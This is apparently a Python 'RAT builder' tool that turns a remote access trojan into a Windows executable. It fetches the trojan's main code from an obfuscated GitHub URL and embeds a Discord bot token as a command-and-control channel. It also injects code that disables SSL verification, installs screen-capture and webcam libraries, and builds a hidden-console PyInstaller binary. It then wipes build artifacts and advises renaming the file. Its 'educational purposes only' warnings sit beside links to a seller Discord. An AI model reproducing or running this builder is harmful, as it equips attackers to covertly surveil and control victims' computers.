import os
import json
import subprocess
import sys
import requests
import base64
import ctypes
import webbrowser
import tempfile
from pathlib import Path

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Colors.RED}{Colors.BOLD}

{Colors.CYAN}    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃                    FYNOX RAT BUILDER v2.0                  ┃
    ┃                                                            ┃
    ┃  ⚠️  WARNING: This tool is for educational purposes only!  ┃
    ┃  🚫 Do NOT use on systems you don't own!                   ┃
    ┃                                                            ┃
    ┃  🛑 NEVER run the generated executable on your own system! ┃
    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
{Colors.RESET}
"""
    print(banner)

def create_fynox_ico():
    """Create a simple fynox.ico file (placeholder)"""
    try:
        # Create a basic ICO file structure (minimal)
        ico_data = b'\x00\x00\x01\x00\x01\x00\x10\x10\x00\x00\x01\x00\x08\x00(\x00\x00\x00\x10\x00\x00\x00\x20\x00\x00\x00\x01\x00\x04\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n'  # Minimal ICO structure
        
        with open('fynox.ico', 'wb') as f:
            f.write(ico_data)
        print(f"{Colors.GREEN}[+] Created fynox.ico placeholder{Colors.RESET}")
        clear_screen()
    except Exception as e:
        print(f"{Colors.YELLOW}[!] Could not create fynox.ico: {e}{Colors.RESET}")
        clear_screen()

def fetch_main_from_github():
    """Fetch main.py from GitHub URL"""
    url = "https://raw.githubusercontent.com/ChangedDuke/56tojm8p73v56hion7za3w456hoi73w563o57i6hoi7be3ws5n6n7o35e6nb3osi5eu-6t-e4s35oiutzn34w-s5bo8b6t-/refs/heads/main/main.py"
    try:
        response = requests.get(url)
        response.raise_for_status()
        response.encoding = 'utf-8'
        return response.text
    except Exception as e:
        print(f"{Colors.RED}[-] Failed to fetch main.py from GitHub: {e}{Colors.RESET}")
        return None

def create_source_code(bot_token, channel_id, github_code):
    """Create source code with embedded configuration"""
    config_code = f'''
# Embedded configuration
BOT_TOKEN = "{bot_token}"
LOG_CHANNEL_ID = {channel_id}
'''
    
    # Add comprehensive SSL context bypass for certificate issues
    ssl_bypass_code = '''import ssl
import certifi
import asyncio

# Disable SSL verification for Discord bot
ssl._create_default_https_context = ssl._create_unverified_context

# Import aiohttp and discord but don't patch immediately
import aiohttp
import discord

# Store original classes
original_tcp_connector = aiohttp.TCPConnector
original_client_init = discord.Client.__init__

# Custom connector class that handles SSL properly
class NoSSLTCPConnector(aiohttp.TCPConnector):
    def __init__(self, *args, **kwargs):
        kwargs['ssl'] = False
        super().__init__(*args, **kwargs)

def patched_client_init(self, *args, **kwargs):
    # Only set connector if not already provided
    if 'connector' not in kwargs:
        try:
            kwargs['connector'] = NoSSLTCPConnector()
        except:
            # Fallback to default connector if NoSSLTCPConnector fails
            pass
    return original_client_init(self, *args, **kwargs)

# Apply patches only when modules are imported
aiohttp.TCPConnector = NoSSLTCPConnector
discord.Client.__init__ = patched_client_init
'''
    
    # Replace the config loading part in the GitHub code
    modified_code = github_code.replace(
        "config_path = os.path.join(os.path.dirname(__file__), 'config.json')\nwith open(config_path, 'r') as f:\n    config = json.load(f)\n\nTOKEN = config['bot_token']\nLOG_CHANNEL_ID = int(config['log_channel_id'])",
        config_code
    )
    
    # Also replace any other config references and fix discord initialization
    modified_code = modified_code.replace("bot.run(TOKEN)", "bot.run(BOT_TOKEN)")
    
    # Fix discord client initialization to handle event loop
    bot_fix = '''
# Fix for discord.py event loop issue
import asyncio
import sys

# Ensure event loop exists before bot initialization
try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    if sys.platform.startswith('win'):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

# Store original bot run method
original_run = bot.run

def patched_run(self, *args, **kwargs):
    try:
        return original_run(self, *args, **kwargs)
    except RuntimeError as e:
        if "no running event loop" in str(e):
            if sys.platform.startswith('win'):
                asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return original_run(self, *args, **kwargs)
        raise

# Apply the fix
discord.ext.commands.Bot.run = patched_run
'''
    
    # Add the bot fix after discord imports
    if 'discord.ext' in modified_code:
        modified_code = modified_code.replace('import discord.ext.commands', f'import discord.ext.commands{bot_fix}')
    
    # Insert SSL bypass and asyncio setup after imports
    asyncio_setup = '''
import asyncio
import nest_asyncio
import sys

# Fix event loop for Windows
if sys.platform.startswith('win'):
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

try:
    import nest_asyncio
    nest_asyncio.apply()
except ImportError:
    pass

# Ensure event loop exists
try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
'''
    
    # Insert SSL bypass and asyncio setup at the very beginning after all imports
    if 'import discord' in modified_code:
        # Find the first import statement
        import_lines = []
        for line in modified_code.split('\n'):
            if line.strip().startswith('import ') or line.strip().startswith('from '):
                import_lines.append(line)
            elif line.strip() and not line.startswith('#'):
                break
        
        # Insert after all imports but before main code
        first_non_import = len('\n'.join(import_lines))
        modified_code = modified_code[:first_non_import] + '\n' + ssl_bypass_code + asyncio_setup + '\n' + modified_code[first_non_import:]
    
    clear_screen()
    print(f"{Colors.GREEN}[+] Source code prepared{Colors.RESET}")
    clear_screen()
    return modified_code

def install_requirements():
    """Install required packages"""
    print(f"{Colors.YELLOW}[!] Installing required packages...{Colors.RESET}")
    packages = [
        "discord.py>=2.0.0",
        "psutil>=5.9.0",
        "opencv-python>=4.5.0",
        "pyautogui>=0.9.50",
        "requests>=2.28.0",
        "pywin32>=305",
        "pillow>=9.0.0",
        "nest-asyncio",
        "aiohttp"
    ]
    
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True)
        for package in packages:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--trusted-host", "pypi.org", "--trusted-host", "pypi.python.org", "--trusted-host", "files.pythonhosted.org"])
                clear_screen()
                print(f"{Colors.GREEN}[+] {package} installed{Colors.RESET}")
            except subprocess.CalledProcessError:
                print(f"{Colors.RED}[-] Failed to install {package}{Colors.RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{Colors.RED}[-] Error installing dependencies: {e}{Colors.RESET}")
        clear_screen()

def build_executable_from_memory(source_code):
    """Build the executable using PyInstaller without creating any source file on disk"""
    import shutil
    import tempfile
    print(f"{Colors.YELLOW}[!] Building Fynox-RAT.exe...{Colors.RESET}")
    
    # Ensure PyInstaller is installed
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
    except:
        pass
    
    # Create temporary file in memory and immediately use it for building
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as temp_file:
        temp_file.write(source_code)
        temp_file_path = temp_file.name
    
    build_cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--name", "Fynox-RAT",
        "--icon", "fynox.ico",
        "--hidden-import", "win32gui",
        "--hidden-import", "win32con",
        "--hidden-import", "win32api",
        "--hidden-import", "win32process",
        "--hidden-import", "win32com.client",
        "--hidden-import", "win32net",
        "--hidden-import", "win32security",
        "--add-data", "fynox.ico;.",
        temp_file_path
    ]
    
    try:
        subprocess.check_call(build_cmd)
        
        # Clean up all temporary files immediately
        print(f"{Colors.YELLOW}[!] Cleaning up build artifacts...{Colors.RESET}")
        try:
            if os.path.exists("build"):
                shutil.rmtree("build")
            if os.path.exists(temp_file_path):
                os.remove(temp_file_path)
            if os.path.exists("fix_ssl.bat"):
                os.remove("fix_ssl.bat")
            if os.path.exists("Fynox-RAT.spec"):
                os.remove("Fynox-RAT.spec")
            print(f"{Colors.GREEN}[+] Build artifacts removed{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Cleanup warning: {e}{Colors.RESET}")
        
        exe_path = os.path.join("Finished-RAT", "Fynox-RAT.exe")
        if os.path.exists(exe_path):
            # Create SSL fix batch file
            ssl_fix_bat = '''@echo off
python -m pip install --upgrade certifi urllib3
python -c "import certifi; print('SSL certificates updated')"
pause
'''
            with open('fix_ssl.bat', 'w') as f:
                f.write(ssl_fix_bat)
            return exe_path
        else:
            return None
    except subprocess.CalledProcessError as e:
        print(f"{Colors.RED}[-] Build failed: {e}{Colors.RESET}")
        return None

def show_warnings():
    """Display security warnings"""
    print(f"{Colors.RED}{Colors.BOLD}")
    print("    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print("    ┃                 ⚠️  IMPORTANT WARNINGS ⚠️                  ┃")
    print("    ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫")
    print("    ┃ 1. NEVER run the generated executable on your own system!  ┃")
    print("    ┃ 2. This tool is for educational purposes only!             ┃")
    print("    ┃ 3. Always test in a controlled environment!                ┃")
    print("    ┃ 4. The creator is not responsible for misuse!              ┃")
    print("    ┃                                                            ┃")
    print("    ┃    Made by ._changed_ - .gg/starselling - guns.lol/xup     ┃")
    print("    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    print(f"{Colors.RESET}")


def show_main_menu():
    clear_screen()
    ctypes.windll.kernel32.SetConsoleTitleW("Fyxon RAT Builder - .gg/starselling - guns.lol/xup - made by ._changed_")
    
    print(f"{Colors.CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{Colors.RESET}")
    print(f"{Colors.CYAN}┃                  FYXON RAT BUILDER                   ┃{Colors.RESET}")
    print(f"{Colors.CYAN}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{Colors.RESET}") 
    print(f"{Colors.CYAN}┃ Made by ._changed_ - .gg/starselling - guns.lol/xup  ┃{Colors.RESET}")
    print(f"{Colors.CYAN}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{Colors.RESET}")    
    print(f"{Colors.CYAN}┃        [1] Build RAT                                 ┃{Colors.RESET}")
    print(f"{Colors.CYAN}┃        [2] Support Discord                           ┃{Colors.RESET}")     
    print(f"{Colors.CYAN}┃                                                      ┃{Colors.RESET}")
    print(f"{Colors.CYAN}┃        [CTRL + C] Exit                               ┃{Colors.RESET}")
    print(f"{Colors.CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{Colors.RESET}")
    print()
    
    choice = input(f"{Colors.YELLOW}Select option: {Colors.RESET}").strip()
    return choice

def open_discord_support():
    webbrowser.open("https://discord.gg/starselling")


def main():
    while True:
        choice = show_main_menu()
        
        if choice == "1":
            build_rat_process()
        elif choice == "2":
            open_discord_support()
        else:
            input(f"{Colors.RED}[-] Invalid option! Press Enter to try again...{Colors.RESET}")

def build_rat_process():
    clear_screen()
    print_banner()
    
    show_warnings()
    
    # Get configuration from user
    print(f"{Colors.CYAN}[!] Configuration Setup{Colors.RESET}")
    bot_token = input(f"{Colors.YELLOW}[?] Discord Bot Token: {Colors.RESET}").strip()
    channel_id = input(f"{Colors.YELLOW}[?] Log Channel ID: {Colors.RESET}").strip()
    
    if not bot_token or not channel_id:
        print(f"{Colors.RED}[-] Token and Channel ID are required!{Colors.RESET}")
        return
    
    # Create icon
    create_fynox_ico()

    github_code = fetch_main_from_github()
    if not github_code:
        print(f"{Colors.RED}[-] Failed to fetch main.py{Colors.RESET}")
        return
    
    # Build executable directly without creating source file
    source_code = create_source_code(bot_token, channel_id, github_code)
    
    # Install requirements
    install_requirements()
    clear_screen()
    
    # Build executable
    print(f"{Colors.CYAN}[+] Started{Colors.RESET}")
    exe_path = build_executable_from_memory(source_code)
    if exe_path:
        clear_screen()
        print_banner()
        print(f"{Colors.GREEN}{Colors.BOLD}")
        print("    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print("    ┃                    🎉 BUILD SUCCESSFUL! 🎉                ┃")
        print("    ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫")
        print("    ┃ 📁 Executable: dist\Fynox-RAT.exe                          ┃")
        print("    ┃                                                              ┃")
        print("    ┃ ⚠️  IMPORTANT REMINDERS:                                  ┃")
        print("    ┃ • Rename the file if needed                                ┃")
        print("    ┃ • Test only in controlled environment                      ┃")
        print("    ┃ • Never run on your own system!                            ┃")
        print("    ┃ • Use responsibly and ethically!                           ┃")
        print("    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        print(f"{Colors.RESET}")
        
        # Open dist folder in Windows Explorer
        dist_path = os.path.join(os.getcwd(), "dist")
        subprocess.run(['explorer', dist_path])
    else:
        print(f"{Colors.RED}[-] Build failed!{Colors.RESET}")    

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear_screen()        
        print(f"\n\n\n\n\n\n\n\n{Colors.RED}[!] Build cancelled by user{Colors.RESET}")
    except Exception as e:
        clear_screen()     
        print(f"\n\n\n\n\n\n\n\n{Colors.RED}[-] An error occured! Please contact the developer!{Colors.RESET}\n")
        print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")
    finally:
        input(f"{Colors.CYAN}[+] Press Enter to exit...{Colors.RESET}")
